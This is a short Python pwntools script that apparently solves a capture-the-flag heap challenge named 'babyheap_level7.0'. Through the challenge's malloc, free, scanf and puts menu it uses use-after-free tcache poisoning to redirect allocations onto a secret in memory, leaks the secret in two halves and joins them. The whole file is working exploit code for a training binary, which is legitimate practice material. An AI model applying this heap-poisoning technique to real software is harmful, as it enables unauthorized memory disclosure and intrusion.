from pwn import *
r = process("/challenge/babyheap_level7.0")
base_addr = 0x00420000
calc_offset1 = base_addr + 23121
calc_offset2 = calc_offset1 + 8
for i in range(0,2):
	r.sendline(b"malloc")
	r.sendline(str(i).encode())
	r.sendline(b"16")
for b in range(0,2):
	r.sendline(b"free")
	r.sendline(str(b).encode())
r.read()
r.sendline(b"scanf")
r.sendline(b"1")
r.sendline(p64(calc_offset2))
for c in range(0,2):
	r.sendline(b"malloc")
	r.sendline(str(c).encode())
	r.sendline(b"16")
r.read()
r.sendline(b"puts")
r.sendline(b"1")
sec_chunck2 = r.read()[40:-56]
log.info(f"Second Half of Secret :{sec_chunck2}")
r.sendline(b"free")
r.sendline(b"0")

for c in range(0,2):
        r.sendline(b"malloc")
        r.sendline(str(c).encode())
        r.sendline(b"16")
for b in range(0,2):
        r.sendline(b"free")
        r.sendline(str(b).encode())
r.sendline(b"scanf")
r.sendline(b"1")
r.sendline(p64(calc_offset1))
for c in range(0,2):
        r.sendline(b"malloc")
        r.sendline(str(c).encode())
        r.sendline(b"16")
r.read()
r.sendline(b"puts")
r.read()
r.sendline(b"1")
sec_chunck1 = r.read()[32:-56]
log.info(f"First Chunck of Secret :{sec_chunck1}")
secret = sec_chunck1.decode().strip()+sec_chunck2.decode().strip()
log.info(f"Secret Word: {secret}")
r.interactive()
